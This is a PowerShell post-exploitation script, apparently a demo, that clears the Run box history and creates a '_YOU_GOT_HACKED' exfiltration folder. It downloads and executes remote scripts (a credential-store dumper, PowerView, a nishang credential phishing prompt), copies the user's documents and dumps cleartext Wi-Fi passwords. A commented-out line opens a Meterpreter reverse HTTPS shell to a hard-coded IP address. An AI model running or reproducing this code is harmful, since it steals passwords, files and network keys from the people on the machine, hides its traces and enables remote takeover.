# REMOVING RUN HISTORY
Write-Host "1. Removing History from Run Box" -ForegroundColor Yellow -BackgroundColor DarkRed
try {Remove-Item -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -Force -ErrorAction SilentlyContinue}Catch{}
Write-Host "        Complete!  Waiting 10 seconds before starting next step" -ForegroundColor Green 
sleep 10

# CREATING REVERSE SHELL TO KALI LINUX ON HTTPS
#iex ((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/ericshoemaker/Invoke-Shellcode-Met/master/Invoke-Shellcode.ps1')); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 38.129.96.54 -Lport 8443 -Force; pause

# CREATING FOLDER IN MY DOCUMENTS
Write-Host "2. Creating Data Exfiltration Folder in $env:USERNAME Documents (Documents\_YOU_GOT_HACKED)" -ForegroundColor Yellow -BackgroundColor DarkRed
$tempvar=New-Item -Path "$env:USERPROFILE\Documents" -Name "_YOU_GOT_HACKED" -ItemType Directory -Force
$ExfilPath="$env:USERPROFILE\Documents\_YOU_GOT_HACKED"
$tempvar=New-Item -Path "$ExfilPath" -Name "UserDocuments" -ItemType Directory -Force
$UserDocsExfil="$ExfilPath\UserDocuments"
Write-Host "        Complete!  Waiting 10 seconds before starting next step" -ForegroundColor Green 
sleep 10

# DUMPING CREDENTIAL STORE PASSWORDS
Write-Host "3. Looking for saved passwords" -ForegroundColor Yellow -BackgroundColor DarkRed
$CredStoreCreds=iex ((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/ericshoemaker/CredentialStore/master/Get-CredStoreCredentials.ps1')) 
$CredStoreCreds | Export-Csv -Path $ExfilPath\CredStore.csv -NoTypeInformation
Write-Host "        Complete!  Waiting 10 seconds before starting next step" -ForegroundColor Green 
sleep 10

# ADDING POWERVIEW MODULES
iex ((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/ericshoemaker/PowerSploit/master/Recon/PowerView.ps1'))

# COPY DOCUMENTS FROM THE COMPUTER
Write-Host "4. Copying documents from $env:USERNAME Documents Folder to Exfiltration Folder" -ForegroundColor Yellow -BackgroundColor DarkRed
Get-ChildItem $env:USERPROFILE\Documents | where {$_.PSIsContainer -ne "$true"}| Copy-Item -Destination $UserDocsExfil
Write-Host "        Complete!  Waiting 10 seconds before starting next step" -ForegroundColor Green 
sleep 10

# GETTING WI-FI PASSWORDS
Write-Host "5. Retrieving Wi-Fi passwords and saving in Exfiltration folder" -ForegroundColor Yellow -BackgroundColor DarkRed
$AllSSIDs=@()
$PatternMatch='.*User profile.*:.*'
$Profiles=netsh.exe wlan show profile | Select-String -Pattern $PatternMatch
Foreach ($WiFiProfile in $Profiles){
    $ProfileName=($WiFiProfile.Matches.GetValue(0).value.split(':')[1]).trim()
    $KeyPattern='.*Key Content.*'
    $ProfileKey=netsh.exe wlan show profile name="$ProfileName" key=clear | Select-String $KeyPattern
    If ($ProfileKey -ne $null){
        $PasswordClear=($ProfileKey.Matches.GetValue(0).value.split(':')[1]).trim()
        $AllSSIDs += ""|Select @{n="SSID";e={$ProfileName}},@{n="Password";e={$PasswordClear}}
        }
    }
$AllSSIDs | Export-Csv $ExfilPath\Wi-Fi_Passwords.csv -NoTypeInformation
Write-Host "        Complete!  Waiting 10 seconds before starting next step" -ForegroundColor Green 
sleep 10

# CREDENTIAL PHISH
Write-Host "6. Making $env:USERNAME give up credentials!" -ForegroundColor Yellow -BackgroundColor DarkRed
iex ((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/ericshoemaker/nishang/master/Gather/Invoke-CredentialsPhish.ps1'))
Invoke-CredentialsPhish | Out-File $ExfilPath\CredPhish.txt
Write-Host "        Complete!" -ForegroundColor Green 

# INFORMING USER OF LOOT
"

"
Write-Host "Script Complete! $env:USERNAME is fully compromised!" -ForegroundColor Yellow 
Write-Host --- $AllSSIDs.Count Wi-Fi passwords stolen! -ForegroundColor Green -BackgroundColor Black
Write-Host --- $CredStoreCreds.Count saved passwords stolen! -ForegroundColor Green -BackgroundColor Black
$DocumentCount=(Get-ChildItem $ExfilPath\UserDocuments).count
Write-Host --- $DocumentCount User Documents Stolen! -ForegroundColor Green -BackgroundColor Black
$CredPhish=(Get-Content $ExfilPath\CredPhish.txt).Split(': ')
$Username=$CredPhish[7] + "\" +$CredPhish[2]
$Password=$CredPhish[5]
$PasswordLength=$Password.Length
$ObfuscatedPassword=$Password[0]
$i=1
While ($i -lt $PasswordLength-2){$ObfuscatedPassword+="*";$i++}
$ObfuscatedPassword+=$Password[$PasswordLength-2]
$ObfuscatedPassword+=$Password[$PasswordLength-1]
Write-Host --- $Username password compromised! $ObfuscatedPassword -ForegroundColor Green -BackgroundColor Black